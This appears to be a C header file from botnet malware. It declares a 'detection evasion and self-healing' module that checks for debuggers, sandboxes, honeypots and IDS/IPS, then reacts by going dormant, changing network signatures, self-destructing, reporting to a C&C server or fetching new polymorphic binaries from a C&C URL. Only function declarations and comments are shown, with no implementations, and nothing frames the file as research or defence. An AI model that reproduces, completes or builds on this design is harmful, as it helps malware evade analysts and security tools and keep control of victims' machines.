/**
 * @file detection_engine.h
 * @brief Detection evasion and self-healing system
 *
 * This module monitors for detection attempts and automatically adapts:
 * - Detects when the bot is being analyzed (debugger, sandbox, etc.)
 * - Monitors network behavior for IDS/IPS signatures
 * - Triggers self-modification when detection is likely
 * - Reports detection events to C&C for global learning
 * - Implements polymorphic code techniques
 */

#ifndef DETECTION_ENGINE_H
#define DETECTION_ENGINE_H

#include <stdbool.h>
#include <stdint.h>
#include <time.h>

// Detection types
typedef enum {
  DETECTION_NONE = 0,
  DETECTION_DEBUGGER,
  DETECTION_SANDBOX,
  DETECTION_ANTIVIRUS,
  DETECTION_IDS_IPS,
  DETECTION_HONEYPOT,
  DETECTION_BEHAVIORAL,
  DETECTION_NETWORK_ANOMALY,
  DETECTION_RATE_LIMIT
} detection_type_t;

// Detection confidence levels
typedef enum {
  CONFIDENCE_LOW = 0,
  CONFIDENCE_MEDIUM,
  CONFIDENCE_HIGH,
  CONFIDENCE_CRITICAL
} confidence_level_t;

// Detection event
typedef struct {
  detection_type_t type;
  confidence_level_t confidence;
  time_t timestamp;
  char details[256];
  uint32_t source_ip;
  uint16_t source_port;
} detection_event_t;

// Evasion strategy
typedef struct {
  bool change_behavior;      // Modify attack patterns
  bool change_signature;     // Modify network signature
  bool change_timing;        // Adjust timing patterns
  bool go_dormant;           // Temporarily stop operations
  bool request_update;       // Request new binary from C&C
  bool self_destruct;        // Remove traces and exit
  uint32_t dormancy_seconds; // How long to sleep if going dormant
} evasion_strategy_t;

// Detection engine context
typedef struct detection_engine detection_engine_t;

/**
 * Initialize detection engine
 *
 * @return Engine instance or NULL on error
 */
detection_engine_t *detection_engine_init(void);

/**
 * Check for debugger attachment
 *
 * @param engine Detection engine instance
 * @return true if debugger detected
 */
bool detection_check_debugger(detection_engine_t *engine);

/**
 * Check for sandbox/VM environment
 *
 * @param engine Detection engine instance
 * @return true if sandbox detected
 */
bool detection_check_sandbox(detection_engine_t *engine);

/**
 * Check for honeypot characteristics
 *
 * @param engine Detection engine instance
 * @param target_ip IP address being attacked
 * @return true if honeypot suspected
 */
bool detection_check_honeypot(detection_engine_t *engine, uint32_t target_ip);

/**
 * Monitor network behavior for IDS/IPS detection
 *
 * @param engine Detection engine instance
 * @param packets_sent Number of packets sent
 * @param packets_dropped Number of packets that were dropped/rejected
 * @return true if IDS/IPS activity detected
 */
bool detection_check_ids_ips(detection_engine_t *engine, uint64_t packets_sent,
                             uint64_t packets_dropped);

/**
 * Analyze detection events and determine evasion strategy
 *
 * @param engine Detection engine instance
 * @param events Array of detection events
 * @param event_count Number of events
 * @param strategy Output: recommended evasion strategy
 * @return 0 on success, -1 on error
 */
int detection_analyze_and_recommend(detection_engine_t *engine,
                                    detection_event_t *events,
                                    size_t event_count,
                                    evasion_strategy_t *strategy);

/**
 * Apply evasion strategy
 *
 * @param engine Detection engine instance
 * @param strategy Strategy to apply
 * @return 0 on success, -1 on error
 */
int detection_apply_strategy(detection_engine_t *engine,
                             evasion_strategy_t *strategy);

/**
 * Report detection event to C&C for global learning
 *
 * @param engine Detection engine instance
 * @param event Detection event
 * @return 0 on success, -1 on error
 */
int detection_report_to_cnc(detection_engine_t *engine,
                            detection_event_t *event);

/**
 * Get detection statistics
 *
 * @param engine Detection engine instance
 * @param total_detections Output: total number of detections
 * @param critical_detections Output: number of critical detections
 * @param last_detection_time Output: timestamp of last detection
 */
void detection_get_stats(detection_engine_t *engine, uint64_t *total_detections,
                         uint64_t *critical_detections,
                         time_t *last_detection_time);

/**
 * Cleanup detection engine
 */
void detection_engine_cleanup(detection_engine_t *engine);

// Polymorphic code support
/**
 * Modify bot's network signature
 * This changes packet characteristics to evade signature-based detection
 *
 * @return 0 on success, -1 on error
 */
int polymorphic_change_network_signature(void);

/**
 * Modify bot's behavior patterns
 * This changes timing, scanning patterns, etc.
 *
 * @return 0 on success, -1 on error
 */
int polymorphic_change_behavior(void);

/**
 * Request binary update from C&C
 * Downloads and verifies new bot binary with different signatures
 *
 * @param cnc_url C&C server URL
 * @return 0 on success, -1 on error
 */
int polymorphic_request_update(const char *cnc_url);

#endif // DETECTION_ENGINE_H
